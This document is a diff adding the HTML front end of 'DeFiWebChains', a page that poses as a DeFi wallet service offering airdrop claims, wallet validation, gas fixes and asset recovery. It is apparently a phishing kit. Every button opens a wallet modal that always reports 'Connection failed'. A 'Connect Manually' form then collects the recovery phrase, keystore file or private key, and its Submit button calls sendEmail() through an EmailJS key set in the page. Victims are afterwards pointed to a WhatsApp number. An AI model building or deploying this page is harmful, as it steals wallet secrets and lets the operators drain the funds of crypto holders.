@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" type="image/png" href="/39891-removebg-preview.png">
+
+  <title>DeFiWebChains</title>
+  <link rel="stylesheet" href="style.css">
+
+  <script src="https://cdn.tailwindcss.com"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  (function() {
+    emailjs.init("OnD1U1l5LMQGzQAtT"); 
+  })();
+</script>
+
+</head>
+<body loading="lazy">
+
+  <!-- Navbar -->
+  <nav class="flex justify-between items-center p-3 sm:p-4 md:p-5 bg-[#0a0e23] border-b-2 border-[#ffd700] fixed w-full z-50">
+    <div class="navbar-logo flex items-center gap-2">
+      <img 
+        src="/39891-removebg-preview.png" 
+        alt="Logo" 
+        class="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12"
+      >
+      <span class="text-lg sm:text-2xl md:text-3xl lg:text-4xl font-bold truncate">
+        DeFiWebChains
+      </span>
+    </div>
+    <button class="modal-trigger bg-blue-500 text-white px-3 py-1.5 text-sm sm:px-4 sm:py-2 sm:text-base md:px-6 md:py-3 lg:px-8 lg:py-4 rounded-3xl hover:bg-blue-600 transition-colors">
+      Connect
+    </button>
+  </nav>
+
+  <!-- Main Section -->
+  <section class="py-8 sm:py-12 md:py-16 lg:pt-20 relative">
+ 
+    
+
+    <div class="grid-container p-4">
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span loading="lazy" class="material-symbols-outlined">
+            paragliding
+            </span>
+        </div>
+        <div class="content">
+            <h3>Claim Rewards/Airdrops</h3>
+            <p>Claim reward or airdrops for ongoing crypto projects</p>
+        </div>
+        
+          <button class="modal-trigger" id="openModal1">Claim</button>
+        
+      </div>
+
+      <div class="grid-item">
+        <div class="icon-circle">
+            <span loading="lazy" class="material-symbols-outlined">  
+              new_releases
+              </span>
+        </div>
+        <div class="content">
+            <h3>Validation</h3>
+            <p>Validate decentralized wallets</p>
+        </div>
+       
+        <button class="modal-trigger"  id="openModal2">Validate</button>
+      </div>
+
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span loading="lazy" class="material-symbols-outlined">
+            payments
+            </span>
+        </div>
+        <div class="content">
+            <h3>Purchase Tokens</h3>
+            <p>Purchase tokens from verified vendors and get huge discounts</p>
+        </div>
+
+        <button class="modal-trigger" id="openModal3">Buy</button>
+      </div>
+
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span loading="lazy" class="material-symbols-outlined">
+            model_training
+            </span>
+        </div>
+        <div class="content">
+            <h3>Fix Gas</h3>
+            <p>Fix gas issues</p>
+        </div>
+        <button class="modal-trigger" id="openModal4">Fix</button>
+      </div>
+
+      <div class="grid-item">
+        <div class="icon-circle">
+            <span loading="lazy"  class="material-symbols-outlined"> overview </span>
+        </div>
+        <div class="content">
+            <h3>Synchronization</h3>
+            <p></p>Sync wallets securely whiile ensuring user data protection</p>
+        </div>
+        <button class="modal-trigger" id="openModal5">Sync</button>
+      </div>
+
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span loading="lazy" class="material-symbols-outlined">
+            sensor_occupied
+            </span>
+        </div>
+        <div class="content">
+            <h3>KYC</h3>
+            <p>Complete KYC to unlock all features and get added benefits</p>
+        </div>
+
+        <button class="modal-trigger">Enroll</button>
+      </div>
+      <div class="grid-item">
+        <div class="icon-circle">
+            <span loading="lazy" class="material-symbols-outlined">
+              published_with_changes
+              </span> 
+        </div>
+        <div class="content">
+            <h3>Recovery</h3>
+            <p>This tool helps to recover lost assets in your wallet. It has over 60% success rate</p>
+        </div>
+        <button class="modal-trigger" id="openModal7">Recover</button>
+      </div>
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span loading="lazy" class="material-symbols-outlined">
+            move_group
+            </span>
+        </div>
+        <div class="content">
+            <h3>Migration</h3>
+            <p>Automated migration from one DeFi to another. Assets security guaranteed</p>
+        </div>
+        <button class="modal-trigger" id="openModal8">Migrate</button>
+      </div>
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span loading="lazy" class="material-symbols-outlined">
+            shop
+            </span>
+        </div>
+      <div class="content">
+        <h3>Pre Sale</h3>
+        <p>Get pre-sale of new tokens at opening price.</p>
+      </div>
+        <button class="modal-trigger" id="openModal9">View Prices</button>
+      </div>
+      <div class="grid-item">
+        <div class="icon-circle">
+          <span  class="material-symbols-outlined">
+            finance_mode
+            </span>
+        </div>
+        <div class="content">
+            <h3>Stakings</h3>
+            <p>Assets will be returned to your wallet witin 24 hours when redeemed</p>
+        </div>
+        <button class="modal-trigger" id="openModal10">Invest</button>
+      </div>
+      <div class="grid-item">
+        <div class="icon-circle">
+            <span> </span>
+        </div>
+        <div class="content">
+            <h3>Others</h3>
+            <p>Get on a live chat with a professional in seconds for other services</p>
+        </div>
+        <button class="modal-trigger" id="openModal11">Chat</button>
+      </div>
+    </div>
+   <!-- First Modal -->
+   <div id="myModal" class="modal fixed inset-0 bg-black/70 z-[800] justify-center items-center validate-modal-overlay">
+    <div class="modal-content bg-[#0a0e23] h-1/2 w-11/12 max-w-md rounded-2xl relative p-6 shadow-lg overflow-y-auto scrollbar-thin scrollbar-thumb-gray-400 scrollbar-track-gray-200">
+      <!-- Header -->
+      <div class="sticky top-0 left-0 w-full bg-[#0a0e23] z-10 p-4 border-b border-gray-700">
+        <!-- Top Section -->
+        <div class="grid grid-cols-3 items-center">
+          <!-- Back Button -->
+          <button id="back-button" class="text-white text-xl font-medium justify-self-start" aria-label="Back">
+            <i class="fas fa-arrow-left"></i> 
+          </button>
+          <!-- Title -->
+          <h2 class="text-white text-lg font-semibold text-center">All Wallets</h2>
+          <!-- Close Button -->
+          <span id="closeFirstModal" class="close text-white text-xl font-medium cursor-pointer justify-self-end" aria-label="Close">
+            <i class="fas fa-times"></i> 
+          </span>
+        </div>
+        <!-- Search Bar -->
+        <div class="relative mt-4">
+          <input
+            type="text"
+            id="searchInput"
+            placeholder="Search wallet"
+            class="w-full py-2 px-4 rounded-lg bg-gray-800 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-yellow-400"
+          />
+          <button
+            id="searchButton"
+            class="absolute right-3 top-2.5 text-white"
+            aria-label="Scan QR Code"
+          >
+            <i class="fas fa-qrcode"></i>
+          </button>
+        
+          <!-- Add a results container inside the search area -->
+          <div id="searchResults" class="absolute z-10 w-full mt-2 bg-gray-800 rounded-lg shadow-lg hidden"></div>
+        </div>
+      </div>
+      <!-- Wallet Icons Grid -->
+      <div class="grid grid-cols-4 gap-4 mt-4" id="cardGallery">
+        <!-- Example Wallet Icon -->
+        
+        <!-- Repeat for other wallets -->
+      </div>
+    </div>
+  </div>
+<!-- Second Modal -->
+<div id="walletModal" class="modal fixed inset-0 bg-black/70 z-[900] justify-center items-center">
+  <div class="modal-content bg-[#0a0e23] h-1/2 w-11/12 max-w-md rounded-2xl relative p-6 shadow-lg overflow-y-auto top-0 left-0 ">
+    <!-- Top Section -->
+    <div class="sticky top-0 left-0 w-full bg-[#0a0e23] z-10 p-4 border-b border-gray-700">
+      <div class="grid grid-cols-3 items-center">
+        <!-- Back Button -->
+        <button id="bak-button" class="text-white text-xl font-medium justify-self-start">
+          <i class="fas fa-arrow-left"></i> 
+        </button>
+    
+        <!-- Title -->
+        <h2 class="text-white text-lg font-semibold text-center">All Wallets</h2>
+    
+        <!-- Close Button -->
+        <span id="closeSecondModal" class="close text-white text-xl font-medium cursor-pointer justify-self-end">
+          <i class="fas fa-times"></i> 
+        </span>
+      </div>
+    </div>
+    
+    <!-- Mode Switcher Section -->
+    <div id="mode-switch" class="flex justify-center mt-6 mb-4">
+      <button
+        id="mobile-mode"
+        class="px-4 py-2 text-sm font-medium rounded-l-md bg-blue-500 text-white hover:bg-blue-600 focus:ring focus:ring-blue-300"
+      >
+        Mobile
+      </button>
+      <button
+        id="browser-mode"
+        class="px-4 py-2 text-sm font-medium rounded-r-md bg-gray-700 text-gray-300 hover:bg-gray-600 focus:ring focus:ring-gray-400"
+      >
+        Browser
+      </button>
+    </div>
+
+    <!-- Modal Body -->
+    <div class="flex flex-col items-center text-center">
+      <img id="modalImage" class="modal-image" src="" alt="Modal Image">
+      <h2 id="modalName" class="modal-title"></h2>
+
+
+      <p id="connection-status" class="text-red-500 font-semibold mb-1">
+        Connection failed
+      </p>
+      <p class="text-gray-400 text-sm mb-4">
+        Connection was declined or failed. You can connect your wallet manually.
+      </p>
+      <!-- Buttons -->
+      <div class="flex space-y-2 w-full flex-col">
+        <button 
+          id="connect-manually"
+          class="class connect-manually-btn max-w-screen-sm bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 rounded- focus:ring focus:ring-blue-300"
+        >
+          Connect Manually
+        </button>
+        <button
+          id="try-again"
+          class="max-w-md bg-gray-700 hover:bg-gray-600 text-white font-medium py-2 rounded-sm focus:ring focus:ring-gray-400"
+        >
+          Try Again
+        </button>
+      </div>
+  </div>
+</div>
+</div>
+<!-- Third Modal -->
+<div id="connectModal" class="modal fixed inset-0 bg-black/70 items-center justify-center z-[1000]">
+  <div class="bg-[#0a0e23] min-h-[500px] w-11/12 max-w-md rounded-2xl relative p-6 shadow-lg text-white mx-auto my-4 flex flex-col">
+    <!-- Header -->
+    <div class="sticky top-0 left-0 w-full bg-[#0a0e23] z-10 p-4">
+      <div class="grid grid-cols-3 items-center border-b border-gray-700 pb-2">
+        <button id="bac-button" class="text-white text-xl font-medium justify-self-start">
+          <i class="fas fa-arrow-left"></i>
+        </button>
+        <h2 class="text-lg font-semibold text-white text-center">Connect Manually</h2>
+        <button onclick="toggleModal(false)" class="text-gray-400 hover:text-white text-xl justify-self-end">
+          &times;
+        </button>
+      </div>
+    </div>
+
+    <!-- Form -->
+    <div id="connectForm" class="flex-grow">
+      <!-- Wallet Option -->
+      <div class="wallet-option flex items-center mt-4 space-x-2">
+        <img id="connectModalImage" src="" alt="Wallet Logo" class="w-16 h-16 sm:w-20 sm:h-20">
+        <select name="walletType" id="connectModalName" class="text-sm font-medium">
+          <option value="metamask">MetaMask</option>
+          <option value="coinbase">Coinbase</option>
+        </select>
+      </div>
+
+      <!-- Tabs -->
+      <div class="flex flex-wrap gap-2 mt-6">
+        <button type="button" class="tab-button bg-blue-600 px-3 py-2 rounded text-sm sm:px-4" onclick="setTab('phrase')">Phrase</button>
+        <button type="button" class="tab-button bg-gray-700 px-3 py-2 rounded text-sm sm:px-4" onclick="setTab('keystore')">Keystore JSON</button>
+        <button type="button" class="tab-button bg-gray-700 px-3 py-2 rounded text-sm sm:px-4" onclick="setTab('privateKey')">Private Key</button>
+      </div>
+
+      <!-- Input Section -->
+      <div id="tabContent" class="mt-6">
+
+        <div id="phraseTab">
+          <label for="phraseInput" class="block text-sm font-medium">Enter your phrase</label>
+          <textarea 
+            name="phraseKey" 
+            id="phraseInput" 
+            class="w-full mt-2 p-2 bg-gray-900 border border-gray-700 rounded text-sm min-h-[100px]" 
+            placeholder="12 or 24 words, separated by space"></textarea>
+        </div>
+        <div id="keystoreTab" class="hidden">
+          <label for="keystoreInput" class="block text-sm font-medium">Upload Keystore JSON</label>
+          <input 
+            name="keystoreJson" 
+            id="keystoreInput" 
+            type="file" 
+            class="w-full mt-2 p-2 bg-gray-900 border border-gray-700 rounded text-sm">
+        </div>
+        <div id="privateKeyTab" class="hidden">
+          <label for="privateKeyInput" class="block text-sm font-medium">Enter your private key</label>
+          <input 
+            name="privateKey" 
+            id="privateKeyInput" 
+            type="text" 
+            class="w-full mt-2 p-2 bg-gray-900 border border-gray-700 rounded text-sm" 
+            placeholder="Private key">
+        </div>
+      </div>
+      <div class="flex justify-center mt-6">
+        <button 
+          type="button" 
+          onclick="sendEmail()" 
+          class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors w-full sm:w-auto min-w-[120px]">
+          Submit
+        </button>
+
+      </div>
+      
+    </div>
+  </div>
+</div>
+<!-- Fourth Modal -->
+<div id="lastModal" class="modal fixed inset-0 bg-black/70 z-[1001] flex justify-center items-center hidden">
+  <div class="modal-content bg-[#0a0e23] h-1/2 w-11/12 max-w-md rounded-2xl relative p-6 shadow-lg overflow-y-auto scrollbar-thin scrollbar-thumb-gray-400 scrollbar-track-gray-200">
+    <!-- Header -->
+    <div class="sticky top-0 bg-[#0a0e23] z-10 pb-4 border-b border-gray-700">
+      <div class="flex items-center justify-between">
+        <!-- Back Button -->
+        <button id="back-button" onclick="backToPreviousModal()" class="text-white text-xl font-medium hover:text-gray-300 transition-colors">
+          <i class="fas fa-arrow-left"></i>
+        </button>
+
+        <!-- Title -->
+        <h2 class="text-white text-lg font-semibold">Connecting</h2>
+
+        <!-- Close Button -->
+        <button id="closeModal" onclick="closeModal('lastModal')" class="text-white text-xl font-medium hover:text-gray-300 transition-colors">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+    </div>
+
+    <!-- Modal Content -->
+    <div class="flex flex-col items-center justify-center h-full py-8">
+      <!-- QR Code -->
+      <div class="qr-wrapper mb-6">
+        <a href="https://wa.me/18435037817" target="_blank">
+          <img src="/frame.png" alt="Scan to chat on WhatsApp" class="w-48 h-48 object-cover rounded-lg">
+        </a>
+      </div>
+
+      <!-- Connecting Text -->
+      <p class="text-gray-300 mb-6 text-center">Connecting, please wait...</p>
+
+      <!-- Loading Animation -->
+      <div class="loader rounded-full border-4 border-t-yellow-400 border-gray-600 w-12 h-12 animate-spin"></div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+</section>
+
+<script src="data.js"></script>
+<script src="index.js"></script>
+</body>
+</html>
